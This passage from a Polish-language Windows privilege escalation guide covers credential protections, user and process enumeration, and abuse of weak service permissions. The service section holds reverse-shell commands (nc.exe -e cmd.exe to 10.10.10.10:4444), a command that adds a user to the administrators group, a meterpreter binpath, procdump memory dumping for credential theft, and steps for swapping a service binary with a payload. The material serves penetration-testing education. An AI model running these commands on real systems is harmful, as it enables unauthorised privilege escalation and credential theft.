**LAPS** służy do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp tylko użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, co pozwala im wyświetlać hasła lokalnego administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywne, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ochrona LSA

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła rozszerzoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** tego procesu lub wstrzykiwania do niego kodu przez niezaufane procesy, zwiększając tym samym bezpieczeństwo systemu.\
[**Więcej informacji o ochronie LSA znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia buforowane

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zwykle zostają utworzone poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach buforowanych znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Wyliczanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do uprzywilejowanej grupy, możesz być w stanie podnieść swoje uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do podniesienia uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na następnej stronie **dowiesz się więcej o interesujących tokenach** i o tym, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Pobieranie zawartości schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, podczas wyświetlania procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne ataki [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) — można je wykorzystać do eskalacji uprawnień.

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż zaobserwowany listener z jego PID-em, właścicielem procesu i możliwością dostępu do niego przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości zdalnego wykonania kodu między użytkownikami. Rutynowe rozpoznanie prowadź pasywnie — nie wysyłaj poleceń debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów z plikami binarnymi procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocesorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź tę konkretną konfigurację i uprawnienia ACL zadeklarowanego katalogu modułów. Jeśli Twój token umożliwia tworzenie tam plików, ta ścieżka może być kandydatem do przeglądu pod kątem code execution przy następnym ładowaniu modułów przez zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta, na którym uruchamiany jest proces, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału; sama możliwość zapisu w katalogu nie dowodzi eskalacji. [Dokumentacja dynamic preprocessor Snort](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa WWW z zapisywalnym katalogiem dokumentów

W przypadku instalacji Apache w systemie Windows porównaj ścieżkę do pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz uprawnienia ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, gdy Apache działa jako `LocalSystem`, server-side code execution może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka i że handler po stronie serwera przetwarza dany typ pliku; sam zapisywalny katalog dowodzi jedynie możliwości tworzenia plików. Sprawdź uprawnienia ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok, w `conf\httpd.conf`, zaś domyślny katalog główny to `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź jednocześnie dokładną ścieżkę obrazu usługi, tożsamość, na której działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Katalog WAMP z prawami zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache wyjaśnia, jak usługa Windows wybiera plik konfiguracyjny](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W przypadku IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w udostępnianym katalogu działa jako pula tylko wtedy, gdy IIS obsługuje dany typ pliku, a ścieżka jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania dla danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka wymagająca analizy: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może to zmienić. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach pozwala modyfikować wygenerowane źródło w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie je skompiluje z użyciem bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Same ACL pliku lub katalogu nie dowodzą możliwości wykonania kodu: powiąż pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej rekompilacji. Korzystaj wyłącznie z przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` często uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zazwyczaj korzysta z anonimowych poświadczeń sieciowych. Pula `SpecificUser` używa skonfigurowanego konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się między wersjami IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej tożsamości sieciowej komputera, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta maszyny lub rola hosta nie potwierdzają ich posiadania. Pasywna enumeracja powinna obejmować przegląd konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, odszyfrowywanie, walidację i konstruowanie polecenia. Handler, który dokleja zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakiem powłoki zmienić polecenie; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient może rzeczywiście wpływać na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub tożsamość podszywania się oraz tożsamość procesu potomnego. Czytelna linia kodu źródłowego, listener na localhost ani słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania uprzywilejowanego polecenia. Podczas pasywnej enumeracji przeglądaj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie zapisywalnego przez użytkownika o niższych uprawnieniach pliku PHP z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, ustalona ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytywać, odpowiednie ograniczenia ścieżek PHP zezwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Listener loopback ani zapisywalny plik same w sobie nie potwierdzają takiego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików bez wywoływania endpointu.

### Pozyskiwanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z Sysinternals. Usługi takie jak FTP mają **poświadczenia zapisane w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Pomoc i obsługa techniczna systemu Windows” (Windows + F1), wyszukaj „wiersz polecenia”, kliknij „Kliknij, aby otworzyć wiersz polecenia”

### Import plików projektu z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu upuszczania, do którego może zapisywać użytkownik o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importującego. Sprawdź **dokładną ścieżkę, do której można zapisywać**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów w Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importującego, jeśli pozwalały na to [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop prowadzący do ujawnienia poświadczeń, a nie bezpośredniego dostępu administratora: uzyskaną odpowiedź trzeba móc wykorzystać przez odrębną, autoryzowaną lub podatną ścieżkę, a bieżące kompilacje należy oceniać na podstawie ich faktycznego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest niezależne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) dla tego prawa stanowi trop do dalszej weryfikacji, a nie dowód, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobną kontrolę dostępu i może się nie powieść, nawet jeśli można użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania oraz ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na komputerze docelowym, do którego **to samo logowanie sieciowe** może zapisywać, jego bazowymi ACL NTFS oraz lokalną ścieżką pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umieszczenia pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale lub sam trop dotyczący tworzenia usługi w SCM nie dowodzi, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać program pomocniczy podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli ten program nie występuje w jej `ImagePath`. Jeśli nazwa programu pomocniczego jest rozwiązywana do katalogu, do którego może zapisywać użytkownik o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocniczy może być potencjalnym kandydatem do podmiany — zależnie od warunków. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie programu pomocniczego**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogów, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Katalog usługi, do którego można zapisywać, ani sam brak pliku nie dowodzą, że usługa go załaduje; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchomienia za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis w chronionym katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje odrębny uprzywilejowany proces lub moduł ładujący, który akceptuje ten plik; sam zapisywalny dziennik lub prawo do uruchomienia nie wystarczają. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, który można odczytać, stanowi **trop do przeglądu konfiguracji**: może zawierać poświadczenia web, a `boot.ini` może przekierowywać konfigurację w inne miejsce. Sprawdź faktyczne konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Wykonywanie z podwyższonymi uprawnieniami wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonywania), skutecznego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza, który uruchomi je w kontekście tożsamości usługi. Interfejs nasłuchujący wyłącznie na loopback nadal może być osiągalny dla użytkownika lokalnego, ale sama ścieżka do pliku, hasło ani nasłuchujący interfejs nie dowodzą istnienia tych praw. Podczas pasywnego rozpoznania sprawdź metadane i uprawnienia, nie wyświetlając sekretów ani nie wywołując API web. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące bezpieczeństwa web i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, z którego uruchamiana jest usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację podrzędną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` określa skonfigurowany katalog roboczy. Sprawdź plik wykonywalny aplikacji podrzędnej i ACL jej katalogu nadrzędnego, zanim uznasz uprawnienia wrappera za całą granicę bezpieczeństwa usługi. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację podrzędną stanowi odrębny trop do dalszej weryfikacji: potwierdź, że użytkownik o niższych uprawnieniach może dotrzeć do nasłuchującego endpointu, że dokładna operacja przyjmuje jego dane wejściowe oraz że aplikacja podrzędna usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL endpointu ani ścieżka, do której można zapisywać, same w sobie nie dowodzą możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania tej **konkretnej** operacji i efektywną tożsamość runspace trzeba sprawdzić osobno. Przepływ danych wejściowych od wywołującego o niższych uprawnieniach do `AddScript` działającego w kontekście tożsamości usługi o wyższych uprawnieniach wyznacza granicę wykonywania kodu; nasłuchujący port, uwierzytelniony klient ani niewykorzystywana metoda w niezwiązanym zestawie nie stanowią same w sobie dowodu. Statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując endpointu podczas rozpoznania.

Service Triggers pozwalają systemowi Windows uruchamiać usługę po wystąpieniu określonych warunków (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich wyzwalacze. Techniki enumeracji i aktywacji opisano tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa zbierająca dane diagnostyczne Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W ataku [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) użyto junction i wyścigu z wykorzystaniem łącza object managera do przekierowania resetowania DACL usługi. Zademonstrowana eskalacja wymagała również dostępnej ścieżki naprawy MSI przez dostawcę WMI Visual Studio Setup oraz pliku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponent naprawiono w styczniu 2024 r.

W ramach pasywnej wstępnej analizy sprawdź konto i ścieżkę pliku binarnego tej konkretnej usługi, zweryfikuj, czy istnieje ścieżka kompilatora Setup WMI, oraz ustal stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio ani plik kompilatora nie dowodzą, że host jest podatny. Do sprawdzenia nie trzeba uruchamiać usługi ani wykonywać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy „Authenticated Users” może modyfikować dowolną usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią powiązanych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Weź pod uwagę, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1)**

**Innym obejściem tego problemu** jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

Jeśli w danym scenariuszu grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik binarny. Aby zmodyfikować i wykonać **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponowne uruchomienie usługi

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia ponowną konfigurację uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i ponowną konfigurację uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Zapewnia również możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejone konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub folder nadrzędny**, często można przejąć kontrolę nad usługą, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (poza system32) możesz wyświetlić wszystkie pliki binarne uruchamiane przez usługę, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Sprawdź, czy niebezpieczne ACL przyznano **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza uprawnienia **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny przebieg nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny można modyfikować, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym złośliwym plikiem binarnym usługi.
4. Uruchom usługę ponownie za pomocą `sc stop <service_name> && sc start <service_name>` (lub poczekaj na ponowne uruchomienie systemu albo wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma skonfigurowaną akcję ponownego uruchomienia po awarii lub można ją pośrednio uruchomić za pomocą korzystającej z niej aplikacji.

### Uprawnienia do modyfikowania rejestru usług

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru danej usługi. Sam wpis ACL nie dowodzi, że dostęp jest efektywny — znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień obiektu usługi `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Eskalacja wymaga również użytecznego pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do uruchamianego pliku binarnego:

```bash
